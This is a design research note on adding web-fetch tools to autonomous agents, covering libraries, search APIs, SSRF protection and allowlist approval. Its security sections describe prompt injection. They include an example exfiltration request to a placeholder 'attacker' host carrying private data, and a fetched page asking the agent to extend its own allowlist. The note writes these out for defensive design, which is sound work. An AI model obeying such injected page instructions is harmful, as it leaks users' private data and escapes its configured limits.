# Web fetch and web search for autonomous agents (research note)

Status: research, input to a design spec. Read §8 first: scope narrowed to web fetch, built in the
agents service, with the draft in §7f; web search is recorded but not planned. No earlier review of this topic was found (docs, memory,
past session transcripts searched 2026-10-08).
Constraints given: favour open solutions; no headless browser, or a very light one (not Playwright).

## 1. Fit with this codebase (facts)

- An autonomous agent's tools come **only** from the MCP catalog (`config.mcpServers`, see
  `api/src/mcp-servers/client.ts`), each entry with `auth: none | apiKey | nhi-session`. A web
  capability therefore fits as **one more catalog entry** — no new tool path in the agent loop.
- Tool `annotations` are recorded per call and feed the approval gate
  (`2026-10-01-tool-approval-gate-design.md`). Web tools should declare `readOnlyHint: true`,
  `openWorldHint: true`.
- SSRF protection already exists in the stack: `@data-fair/lib-node/ssrf.ts` +
  `http-agents.ts` (public-only agents, `SSRF_PUBLIC_IPS` / `SSRF_PRIVATE_IPS`), checked at DNS
  resolution so redirects and rebinding are covered. A fetch tool must use these agents.
- Quotas are token-based. A paid search API is a per-call cost outside that accounting.

## 2. Two capabilities, two different problems

**web_fetch** (URL → readable text) is a solved problem without a browser for most of the web.
**web_search** (query → ranked URLs + snippets) needs an index, which nobody can self-host at web
scale: the real choice is *whose index*, and how open the access to it is.

## 3. web_fetch options

| Option | License | Browser | Notes |
|---|---|---|---|
| HTTP GET + **linkedom** + **@mozilla/readability** + **turndown** | MIT / Apache-2.0 / MIT | none | Readability is the Firefox reader mode; aggressive, good on articles, can drop content on non-article pages. Pure Node, in-process, ms per page. |
| Same, with **defuddle** instead of Readability | MIT | none | Obsidian Web Clipper's engine; keeps more, standardises code/footnotes/math, outputs markdown directly. Younger, less benchmarked. |
| **trafilatura** | Apache-2.0 | none | Best boilerplate rejection in the one (vendor) comparison found; Python, so a separate process/service. |
| **Lightpanda** (Zig, V8, no renderer) | AGPL-3.0 | light | CDP + MCP + `fetch`-to-markdown CLI; vendor bench ~10× less memory than Chrome. Beta, incomplete Web APIs. Candidate *fallback* for JS-only pages, run unmodified as a sidecar (AGPL then costs nothing). |
| **Obscura** (Rust) | — | light | Markdown via CDP, built-in SSRF guard, but stealth/TLS-fingerprint spoofing is its pitch — not a posture we want. Immature. |
| Jina Reader (self-hosted) | Apache-2.0 | Chrome (puppeteer) | Hosted `r.jina.ai` is convenient but sends every URL to a third party. Self-host = full Chrome. |
| Crawl4AI / Firecrawl self-hosted | Apache-2.0 / AGPL-3.0 | Playwright | Crawlers, multi-container; excluded by the constraint. |
| Provider-native fetch (Anthropic `web_fetch`) | closed | — | See §5. |

Pipeline that needs no browser:
1. Validate URL (http/https only), GET with the lib-node public agents, no cookies, honest
   `User-Agent`, redirect cap, timeout, **byte cap on the body**; optional robots.txt check.
2. Dispatch on content type: HTML → DOM → Readability/defuddle → markdown; `text/*`, JSON, CSV →
   as is; PDF → `unpdf`/pdf.js text (no browser either).
3. Return title, final URL, and markdown truncated with an `offset` to read on — the same shape
   Claude Code's own WebFetch uses, so the model can page through long documents itself rather
   than having a summarizer model in the loop.
4. Pages that yield almost nothing (SPA shells) report so explicitly ("page requires
   JavaScript") instead of returning an empty success. Measure how often this happens before
   deciding whether the Lightpanda fallback is worth deploying.

## 4. web_search options

| Option | Index | Openness | Cost | Notes |
|---|---|---|---|---|
| **SearXNG** self-hosted | metasearch (Google, Bing, DDG, Brave, Mojeek, Qwant, Wikipedia…) | AGPL-3.0, no keys | infra only | JSON format must be enabled in `settings.yml`. Fragile in production: upstream engines rate-limit / CAPTCHA datacenter IPs, and scraping them is against their ToS. Fine for dev and modest load; quality depends on which engines still answer. |
| **Staan** (EUSP = Qwant + Ecosia) | own European index | commercial API, self-service since 2026 | not published ("a tenth of Google/Bing", vendor claim) | Sovereign, aimed explicitly at AI agents, returns content/markdown too. Coverage still growing. Worth an account to evaluate. |
| **Mojeek** | own index (UK) | commercial API | £1–3 / 1k queries | Independent crawler, privacy-first, smaller index. Discounts for open/non-commercial. |
| **Brave Search API** | own index (US, 30–40B pages) | commercial API | $5 / 1k, $5 monthly credit | Best quality/price of the independent indexes; US company. |
| **Linkup** | (FR) | commercial API | ~€5 / 1k standard | EU data residency, SOC 2; returns sourced answers too. |
| Tavily / Exa | US | commercial API | $5–8 / 1k | Tavily acquired by Nebius in 2026. No EU positioning. |
| **Open Web Index** (OpenWebSearch.eu) | open European index | research licence, commercial on request | — | EU project ended Feb 2026, continues as an initiative; still a pilot. Not production-ready; worth watching. |
| Provider-native search | provider's | closed | per call + tokens | See §5. |

## 5. Provider-native tools — rejected

Anthropic (`web_search`, `web_fetch`), OpenAI (`web_search`), Mistral (agents connector) run search
server-side at the provider. They would:
- work only on that provider, while the service is provider-agnostic (AI SDK, LiteLLM/GreenPT in
  deployments, mock/bridge in dev);
- bypass the MCP catalog, so no provenance, annotations or approval gate;
- bill outside our quota accounting.

## 6. Security: the part that matters most

An autonomous agent with a fetch tool **and** private data from stack MCP tools **and** exposure to
untrusted content (any fetched page) is the "lethal trifecta": a page can instruct the agent to
`GET https://attacker/?q=<private data>`. Read-only GET is not harmless. Options, cheapest first:
- **Per-agent domain allowlist** on the catalog reference (like `toolFilter`), default empty =
  search-only, or fetch restricted to URLs returned by a previous search in the same turn.
- Route fetches of non-allowlisted domains through the **approval gate** (needs a human, so only
  for supervised agents).
- Strip/limit query strings on unlisted domains (partial mitigation, easy to bypass).
- Wrap fetched content as untrusted data in the tool result (does not stop injection, helps).
Plus the usual: SSRF agents (§1), body cap, timeout, no credentials ever forwarded.

## 7. Recommendation (first pass — superseded by §7b and §8)

1. A small, separate **`web` MCP server** (Node, data-fair style), deployed as its own container
   with an egress-only network policy, added to the catalog with `auth: none` or `apiKey`. Keeping
   it out of the agents API process isolates the network position that SSRF protects.
   (Alternative: a hand-written tool set in `data-fair/mcp`, like `geocode_address` — but that
   server is per-portal and its network position reaches stack services; a fetcher should not.)
2. **`web_fetch`**: §3 pipeline, linkedom + defuddle (or Readability, pick on a sample of our real
   target pages) + turndown, PDF via unpdf. No browser. Lightpanda as an optional sidecar later,
   only if measured SPA failures justify it.
3. **`web_search`** behind a one-function backend interface, configured per deployment:
   SearXNG for dev and fully-open deployments; **Staan** (EU, independent) or Brave/Mojeek for
   production quality. Same tool schema whatever the backend.
4. Ship with the **domain allowlist** of §6 from day one; decide the default before an agent that
   also holds private data gets web access.

## 7b. Revision: web_fetch as a service tool, not a separate MCP server

Focus narrowed to fetch / basic crawling, with per-agent configuration (at least a domain allowlist).

**Per-agent config across an MCP boundary has no good shape.** The server cannot hold it (a second
admin surface keyed on agent identity), the model must not carry it (tool arguments are
model-controlled), so the agents service would forward it — a new generic "per-reference options"
mechanism on catalog entries, sent as headers, with an option schema the agents UI cannot render
unless the server publishes one. That is a protocol of our own on top of MCP, for one consumer.

**The service already has the in-process pattern.** `api/src/conversations/service-tools.ts` is a
registry of the service's own tools (`wait_for_user_action`, `memory`, `report_outcome`), each with
`applies(ctx)` and `build(ctx)`, provenance and annotations. Memory is configured exactly the way
web fetch needs to be: a section on the autonomous-agent schema (`memory: { enabled }`), rendered
by vjsf, read in `applies`. Web fetch is one more entry and one more schema section.

**Measured cost of the library side** (prototype, 2026-10-08, Node 24): `defuddle` (MIT, 0.19)
already depends on `linkedom` and `turndown` and takes a linkedom `Document`, returning markdown,
title and word count. So the whole extraction is one dependency:

| Page | HTML | Markdown | parse + extract |
|---|---|---|---|
| fr.wikipedia.org article | 418 KB | 71 KB | 460 ms |
| data.gouv.fr dataset | 127 KB | 2 KB | 93 ms |
| koumoul.com | 118 KB | 1 KB | 95 ms |
| github.com repo | 339 KB | 10 KB | 418 ms |
| lemonde.fr home | 1.99 MB | 20 KB | 1155 ms |
| legifrance.gouv.fr | — | — | 403, Cloudflare challenge |

Quality is good on content pages (data.gouv.fr strips to the description). Two consequences:
- **Extraction is CPU-bound and synchronous: up to a second for a 2 MB page.** In the process that
  runs every conversation's loop, it must run in a `worker_threads` worker (or small pool) with a
  body cap (a few MB) — otherwise one fetch stalls every live turn.
- Bot-protected sites (Cloudflare) refuse an honest client; a headless browser would not reliably
  fix that either, and evading it is not a posture to take. Report it as a clear tool error.

**What stays to be careful about in-process:** the agents API's network position reaches internal
services, so the lib-node public agents (DNS-time SSRF check) are mandatory, plus redirect cap,
timeout, body cap, http(s) only, no cookies or credentials.

**Proposed shape**
- Schema: `web: { enabled, domains: string[] }` on the autonomous agent (patterns like
  `data.gouv.fr`, `*.insee.fr`); room for later options (PDF, max fetches per run, robots.txt
  policy, same-domain link following).
- Tool `fetch_url({ url, offset? })` → `{ url, title, content (markdown page), nextOffset?, links? }`.
  Refuses any URL (and any redirect target) outside `domains`, naming the allowlist so the model
  can explain. Annotations `readOnlyHint: true, openWorldHint: true`.
- "Basic crawling" = the model following returned links within the allowlist, bounded by a
  per-run fetch budget — no crawler engine.
- If a JS-rendering or shared fetch backend is ever needed, only the engine moves out of process;
  config and enforcement stay in the agents service.

## 7c. Using a website's own search

Most site searches are a GET URL with a query string, which `fetch_url` can request like any page.
Measured with the prototype (2026-10-08):

| Site | Search URL fetched | Result |
|---|---|---|
| service-public.gouv.fr | `/particuliers/recherche?keyword=passeport` | ✅ "213 résultat(s)", clean list of links |
| data.gouv.fr | `/fr/datasets/?q=adresse` | ✅ results in the page (Base Adresse Nationale first) |
| fr.wikipedia.org | `/w/index.php?search=open+data` | ✅ redirects to the matching article |
| insee.fr | `/recherche?q=chomage` | ❌ empty shell, results loaded by JavaScript |

**The model must learn the search URL, and defuddle hides it**: forms are stripped as boilerplate.
Fix, cheap: before extraction, read from the raw HTML and return beside `links`:
- **GET forms**: action + visible field names. Found on Wikipedia (`GET /w/index.php [search]`) and
  service-public (`GET …/recherche [keyword]`); none on data.gouv.fr, insee.fr (JS).
- **OpenSearch descriptions** (`<link rel="search">`): a standard URL template. Found on GitHub
  (`/opensearch.xml`) and Wikipedia.
- POST forms are reported as unusable: the tool stays GET-only (POST usually means a write).

**JS-driven searches** cannot work through the page without a browser. The usual way round is the
JSON API the page itself calls (`data.gouv.fr/api/1/datasets/?q=adresse` returns structured
results; `fetch_url` passes JSON through), known to the model, documented by the site, or given in
the agent's instructions by an admin.

The allowlist is unaffected: a search URL stays on its domain. But free text in a query string is
also a channel out of the conversation — harmless on allowlisted domains, one more reason against
an "any domain" option.

## 7d. Sitemaps

Sitemaps cover what JS-only searches do not: a site whose search needs a browser usually still
publishes plain XML. Probed (2026-10-08):

| Site | Discovery | Content |
|---|---|---|
| data.gouv.fr | `robots.txt` → index | 2 children; `pages.xml` = 59 URLs, 6 KB |
| service-public.gouv.fr | no robots line; `/sitemap.xml` → index | **14 children × 5,000 URLs, 1.1 MB each** (~70k URLs) |
| ecologie.gouv.fr | `/sitemap.xml` → index | 16 children named by content type (`variant_press`, `variant_project`…), with `lastmod` |
| koumoul.com | `robots.txt` | 62 URLs with `lastmod` |
| lemonde.fr | `robots.txt` (4 sitemaps) | news sitemap = 246 of today's articles, descriptive slugs |
| insee.fr | `robots.txt` | index is empty |
| wikipedia, legifrance | — | 403 |

Findings:
- **Discovery is cheap**: `Sitemap:` lines in `robots.txt`, fallback `/sitemap.xml`, follow
  `<sitemapindex>` one level. Worked on 6 of 8 sites.
- **Size is the problem**: 70k URLs cannot go into context, so `fetch_url` on a raw sitemap is
  useless there. The tool must filter and paginate.
- **URLs carry meaning**: descriptive slugs and child-file names make a substring filter over URLs a
  workable search for sites whose search is JS-only. `lastmod` allows "what changed since X" —
  well suited to a planned task.
- **The allowlist must handle sibling domains**: service-public's index on `.gouv.fr` lists children
  on `www.service-public.fr`, which redirect back to `.gouv.fr`. The check applies at every hop.

Proposed second tool, `list_site_pages({ site, contains?, since?, offset? })`:
1. Discovers sitemaps via `robots.txt` then `/sitemap.xml`; every URL, redirects included, checked
   against the agent's allowlist.
2. Without a filter on an index: returns the child sitemaps (names, `lastmod`) — already a table of
   contents.
3. With `contains` (path substring) or `since` (date): walks the children, returns matching URLs
   with `lastmod`, paginated.
4. Caps: N child files and N MB per call; `.xml.gz` via `node:zlib`; parsed sitemaps cached briefly
   so paging does not re-download.

No new dependency: `<loc>`/`<lastmod>` extraction and index walking is ~50 lines on the same SSRF
agents. npm packages like `sitemapper` bring their own HTTP client, which would bypass the SSRF
guard.

Together the two tools are the "basic crawling": narrow the site with `list_site_pages` (or its
search form), read what matters with `fetch_url`, under the per-run fetch budget. No crawler engine.

## 7e. Scenario check: a "what's new" editorial agent

Hypothetical agent configured by us: watch recently created master-data datasets on the platform,
new pages on our doc sites, recent GitHub releases; suggest newsletter content, flag doc gaps.
Question: can the generic fetch tools cover the non-platform parts without a dedicated MCP?
Probed 2026-10-08:

| Need | Request | Result |
|---|---|---|
| Releases | `github.com/data-fair/data-fair/releases` (HTML) | ✅ 445 KB → 20 KB clean markdown: versions, dates, "What's Changed" with PR links |
| Recent activity | `github.com/data-fair/data-fair/commits/master` | ✅ 2 KB markdown, commits grouped by day |
| Releases, structured | `api.github.com/repos/data-fair/data-fair/releases?per_page=3` | ✅ JSON, 10 KB — but **60 requests/hour unauthenticated, per IP** |
| Org-wide activity | `api.github.com/orgs/data-fair/repos?sort=pushed` | ✅ JSON, same limit |
| Releases feed | `github.com/…/releases.atom` | ✅ 78 KB raw Atom XML — usable only with a feed handler |
| Old docs | `data-fair.github.io/3/` | 404 page saying "moved", linking docs.koumoul.com and datafair.cloud — the model follows it if those are allowlisted |
| Docs new pages | `docs.koumoul.com/sitemap.xml`, `datafair.cloud/sitemap.xml` | ✅ 11 and 52 URLs with `lastmod` (11 looks incomplete for a tutorials site — ours to fix) |
| Platform datasets | — | the data-fair MCP (catalog, nhi-session), not fetch |

Conclusion: **realistic**. Models know GitHub's URL patterns and API; the HTML pages alone suffice
for releases and commits. What makes it robust, all small:
- **Dispatch on content type, before defuddle**: defuddle is an HTML extractor and must not see JSON
  or XML. JSON passes through (pretty-printed, paginated like markdown); **RSS/Atom are rendered as a
  compact list (title, date, link)** — feeds are the natural "what's new" source and many sites have
  them; plain XML passes through.
- **Rate limits on the shared egress IP**: every agent of a deployment shares one address, so
  GitHub's 60/h unauthenticated API budget is shared too. HTML pages are the fallback; a later option
  is an **ops-owned credential per domain** (deployment secret injected as a header, like the MCP
  catalog's `apiKey` auth), lifting GitHub to 5,000/h. Never agent- or model-supplied.
- **"New since last time"** is not a fetch feature: a planned task runs the agent periodically, the
  agent's memory (P3) keeps the last release / `lastmod` seen, `report_outcome` delivers the
  suggestions. The pieces exist.

A dedicated GitHub MCP is then only needed for private repositories, issue/PR search at volume, or
writes. The same reasoning extends to any public site with readable HTML, a sitemap, a feed or a
JSON API — which is the point: one generic tool pair, configured by an allowlist, covers a broad
class of multi-platform monitoring use cases.

## 7f. Functionality draft (consolidates 7b–7e)

### Scope

Configured autonomous agents. Fetch and basic crawling of public web content; no web search engine
(§4 stays a separate decision); no headless browser; no credentials of any kind.

### Configuration (autonomous-agent schema)

```
web: {
  enabled: boolean,          // default false
  domains: string[],         // 'data.gouv.fr', '*.koumoul.com'; no bare '*'
  domainsUpdatedBy?: { ... } // who approved the last change, from which conversation (see below)
}
```
Room for later options (max fetches per run, PDF, robots.txt policy, per-domain ops credentials).

### Tools (entries of `api/src/conversations/service-tools.ts`)

| Tool | Surfaces | Approval | Does |
|---|---|---|---|
| `fetch_url({ url, offset? })` | chats, task runs | none (allowlist is the control) | GET, content-type dispatch, one page of output + `nextOffset`; HTML also returns `links`, GET `forms` and OpenSearch templates (§7c) |
| `list_site_pages({ site, contains?, since?, offset? })` | chats, task runs | none | sitemap discovery and filtering (§7d) |
| `request_web_domains({ add, remove?, reason })` | chats only | **always** | proposes an allowlist change; see below |

All three only when `web.enabled`. Annotations: `readOnlyHint: true, openWorldHint: true` for the
two readers; the third is a configuration write. A per-run fetch budget bounds crawling.

**Content-type dispatch**: HTML → defuddle (linkedom document) → markdown, in a worker thread with a
body cap; JSON → pass-through, pretty-printed and paginated; RSS/Atom → compact list (title, date,
link); other `text/*` and XML → pass-through; anything else (later PDF) → explicit "unsupported".
A near-empty extraction says "the page needs JavaScript"; a bot challenge (e.g. Cloudflare 403)
says so — never an empty success.

**Network**: `@data-fair/lib-node` public agents (SSRF check at DNS resolution), redirect cap with
the allowlist checked at every hop, timeout, http(s) only, no cookies, no `Authorization`, honest
`User-Agent`. Note: lib-node disables its SSRF check when an HTTP proxy env var is set — a
deployment with an egress proxy must filter there.

### Self-configuring the allowlist, with instructor approval

Same logic as `plan_task` (`2026-10-07-autonomous-agent-planned-execution-design.md`): a service
tool that **always** goes through the approval gate, chats only, never in a task run.
- The agent calls `request_web_domains({ add: ['docs.koumoul.com'], reason })`, typically after a
  refusal that named the allowlist, or a "moved" page pointing elsewhere.
- The turn stops on the approval card: current list, proposed list (additions highlighted), the
  agent's stated reason, and a reminder that pages on these domains will be able to instruct the
  agent (see warning below).
- **Only admins of the owning organization may approve** (decided 2026-10-08) — unlike `plan_task`,
  where the instructor decides: widening the list widens who can instruct the agent. Simplest form:
  the tool is offered only when the person in the chat is such an admin; with any other instructor,
  `fetch_url`'s refusal tells the model to ask an admin to extend the allowlist. The decision route
  also checks the role, so a card cannot be approved by a non-admin.
- Approving validates the patterns (syntax, no bare `*`, a count cap), writes `web.domains`, records
  the approver and the conversation; declining returns the reason to the model.
- This is the main target of an injection: a fetched page asking the agent to "add example.com".
  The human decision is the defense — so the card must make the domain unmistakable.

### HTTP cache

Possible precisely because no credentials are ever sent: every response is public by construction,
so one cache can be shared by every agent of the instance.
- axios (already a dependency) + `axios-cache-interceptor` (MIT) on the public agents: honours
  `Cache-Control`, revalidates with `ETag` / `Last-Modified`. Not undici's cache interceptor: it
  would mean leaving the lib-node agents, i.e. the SSRF guard.
- A **freshness floor** (e.g. 10 min) regardless of headers, so agents and repeated runs share
  fetches; `no-store` respected. In memory, byte-capped LRU, per instance (deployments are sticky;
  a second instance merely has its own cache).
- Cache the **extracted output** too, keyed by URL + validator, to skip the CPU cost on a hit.
- Revalidated 304s are also what GitHub recommends for staying under its rate limit (304s to
  conditional requests do not count against the primary limit — per GitHub's docs, to verify on
  unauthenticated calls).
- If per-domain ops credentials are ever added, those requests must bypass or be keyed apart from
  this cache.

### Warning: prompt injection

Shown in the agent form when `web.enabled` is switched on, and in the `request_web_domains` card:

> Pages on the allowed domains are read by the agent as text, and text can contain instructions.
> Enabling web access means **the authors of every page on these domains can, in effect, instruct
> this agent** — with its identity and all its tools. They can also make it send information out,
> for instance in a search query on an allowed site.
> Enable this only on agents with very restricted write and administration capabilities: catalog
> tools that read only, or `write` and `destructive` set to *Approve* or *Never offer*.

The form can make it concrete: the tool inventory with annotations is already known (the
self-knowledge tool lists it), so when web is enabled the form lists the tools usable without
approval that write, destroy or come from an admin profile, and recommends restricting them.
**Warn only, never block** (decided 2026-10-08) — admins decide.

## 8. Decisions (2026-10-08)

- Fetch only, built in the agents service as service tools (§7b, §7f). §7's separate-MCP-server
  recommendation is superseded.
- Configured autonomous agents only: **no web access for the personal assistant**.
- **No web search for now.** §4 and §5 are kept as a record of the options, nothing is planned on
  them (questions left unanswered: default exposure, who pays, Staan's terms).
- The injection warning only warns, never blocks.
- Only admins of the owning organization approve an allowlist change.
- The allowlist is **URL prefixes, not domains** (`web.allowedUrls`): the GitHub watcher of §7e
  needs `github.com/data-fair`, not all of `github.com`. Matched at a path boundary; a site's
  robots.txt, sitemaps and search description stay readable on any host with an allowed URL. The
  tool proposed as `request_web_domains` is `request_web_access`. As built:
  `docs/architecture/web-access.md`.

## Sources

[SearXNG for agents](https://blog.elest.io/give-your-ai-agent-private-web-search-self-host-searxng/),
[SearXNG JSON API](https://dev.to/techpotions/searxng-json-api-for-llm-grounding-2gaa),
[European search engines 2026](https://euvetted.com/insights/european-search-engines),
[Staan self-service API](https://onlinemarketing.de/seo/europaeische-search-api-staan-jetzt-als-self-service),
[Qwant / Staan](https://en.wikipedia.org/wiki/Qwant),
[Ecosia European index](https://blog.ecosia.org/launching-our-european-search-index/),
[Mojeek API](https://www.mojeek.com/services/search/web-search-api/),
[Brave Search API](https://brave.com/search/api/),
[Linkup — EU search APIs](https://linkup.so/blog/web-search-apis-in-europe-which-one-should-you-choose),
[Open Web Index](https://openwebsearch.eu/open-webindex/),
[trafilatura vs Readability](https://thunderbit.com/blog/trafilatura),
[Defuddle](https://news.hada.io/topic/27540.md),
[Lightpanda](https://www.scrapingbee.com/blog/lightpanda-headless-browser/),
[Obscura](https://pyshine.com/Obscura-Headless-Browser-for-AI-Agents/),
[Firecrawl self-host license](https://webscraping.ai/faq/firecrawl/is-firecrawl-open-source-and-can-i-self-host-it),
[Crawl4AI vs Firecrawl](https://use-apify.com/blog/firecrawl-vs-crawl4ai).
Prices and vendor benchmarks are as published by vendors or aggregators in 2026 and unverified.
